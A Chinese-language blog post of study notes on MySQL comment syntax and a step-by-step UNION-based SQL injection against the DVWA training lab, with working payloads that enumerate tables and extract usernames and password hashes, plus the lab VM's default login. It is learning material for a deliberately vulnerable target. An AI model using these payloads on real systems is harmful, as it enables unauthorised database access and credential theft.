---
layout: post
title: MySQL注释与SQL注入流程笔记
date: "2026-10-29 14:30:00 +0800"
categories: [课外拓展, MySQL, Web安全]
tags: [mysql, sql-injection, dvwa]
---

## 一、学习环境

- 靶场：OWASP Broken Web Apps v1.2，DVWA安全等级low
- 数据库：MySQL 5.1.41
- 远程登录：ssh -o HostKeyAlgorithms=+ssh-rsa root@192.168.216.129，密码owaspbwa
- 数据库登录：mysql -u root -p，root有密码，不是空密码

## 二、注释

注释是写在代码里、不参与执行的文本，作用有三：说明代码意图、临时屏蔽代码、标记待办。

SQL支持三种注释：

| 写法 | 规则 | 结束位置 |
|---|---|---|
| # | MySQL专用，不需要空格 | 行尾 |
| -- | 标准SQL，后面必须跟空格 | 行尾 |
| /* */ | 块注释，可以跨行 | 闭合符号 |

**测试语句**

```sql
select 1; # 这是注释
select 1; -- 这是注释
select /* 这是注释 */ 1;
select 1, /* 2, */ 3;
```

预期结果：前三条返回1；第四条只返回1和3两列，因为2被块注释吃掉了。

**分号必须写在注释前面**

写成`select 1 # 注释;`，井号会把同一行后面的分号一起注释掉，客户端认为语句没结束，提示符停在`->`。正确写法是`select 1; # 注释`，先结束语句，再写注释。

**注释在注入里的作用**

字符型注入闭合引号后，程序末尾还剩一个引号，会导致语法错误。注释符把这个多余部分截断，语句才合法。所以注释在注入里不是写说明，是删垃圾。

## 三、注入流程

标准八步，前四步探路，后四步取货。

| 步骤 | 目的 | DVWA输入 | 预期结果 |
|---|---|---|---|
| 1 | 建立基线，看正常返回 | 1 | 返回用户记录 |
| 2 | 判断类型，确认引号被拼接 | 1' | 报错或空白 |
| 3 | 闭合并注释，修好语法 | 1' # | 数据恢复 |
| 4 | 数列数 | 1' order by 2 # | 正常 |
| 5 | 验证列数，找第一处报错 | 1' order by 3 # | 报错或空白 |
| 6 | 找回显位 | 1' union select 1,2 # | 显示1和2 |
| 7 | 查库名 | 1' union select 1,database() # | dvwa |
| 8 | 查表名 | 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # | guestbook,users |

DVWA的SQL Injection模块，后端查询是：

```sql
select first_name, last_name from users where user_id = '$id'
```

两列，字符型，引号包裹。所以payload必须带闭合引号和注释符。

**后续两步**

查字段：

```sql
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```

取数据：

```sql
1' union select user,password from users #
```

想看清格式，用0x3a代替冒号拼接：

```sql
1' union select 1,group_concat(user,0x3a,password) from users #
```

## 四、踩坑记录

**坑一：关键字被拆成两行**

输入`sele`回车，再输入`ct 1 #注释`，客户端把两行拼成`sele ct 1`，中间多出空格，`sele`和`ct`成了两个词，报ERROR 1064。关键字必须在一行里写完。

**坑二：分号被注释吃掉**

写`select 1 #注释;`，分号在井号后面，同样被注释，语句没有结束符，提示符变成`->`。

**坑三：在->提示符下又敲新语句**

`->`表示上一条还没结束。这时输入新语句会被接到后面，拼成一条语法混乱的语句，继续报1064。

正确做法：输入`\c`回车取消，回到`mysql>`重新写。注意是反斜杠。

**坑四：在Windows里执行mysql**

SSH断开后，提示符变成`PS C:\Users\lihao>`，这时输入`mysql -u root -p`会报CommandNotFoundException。mysql客户端只装在虚拟机里，Windows上要用必须先SSH进去。

**坑五：SSH连接被重置**

终端出现`client_loop: send disconnect: Connection reset`，说明会话断了，人已经回到Windows。重新执行ssh命令即可，数据不会丢。

**坑六：MySQL root不是空密码**

直接`mysql -u root`报ERROR 1045 Access denied，因为没带密码。改用`mysql -u root -p`，输入密码后才能进入。

## 五、问题与解答

**问：注释是什么意思。**

答：写在代码里给人看的说明文字，计算机执行时跳过。和书页边的批注一样，不影响正文。

**问：单行注释和块注释的区别。**

答：单行注释只对当前行生效，到行尾结束；块注释从`/*`到`*/`，可以跨多行。SQL里`#`和`--`是单行，`/* */`是块。

**问：为什么注释能让报错的语句恢复正常。**

答：字符型注入闭合引号后，程序末尾多出一个孤立引号，语法不合法。注释把这个引号连同后面的内容一起忽略，语句重新变成合法的查询。

**问：为什么分号要写在注释前面。**

答：注释到行尾结束，分号写在注释后面会被一起忽略，客户端认为语句没写完。

**问：select后面的星号是什么。**

答：星号表示所有列。探索表结构时方便，只取几列或拼UNION时不要用，UNION要求列数明确。

**问：为什么注入要先order by数列数。**

答：UNION要求前后两条查询列数一致，不知道列数就无法写对齐的payload。order by超出列数会报错，用报错位置反推列数。

## 六、总结与反思

1、注释是工具，不是装饰。在注入里它的作用是截断语句，让拼接后的SQL重新合法。
2、写注释测试时，分号在前、注释在后，否则分号会被吃掉。
3、注入流程是固定骨架：找点、判型、数列、回显、库、表、字段、数据。顺序不能颠倒，后一步依赖前一步的结果。
4、报错要会读。1064是语法错，1046是没选库，1045是密码错，1146是表不存在。
5、环境问题也是学习内容。SSH断线、Windows没有mysql客户端、root有密码，这些不在课程里，但每个都会卡住操作。
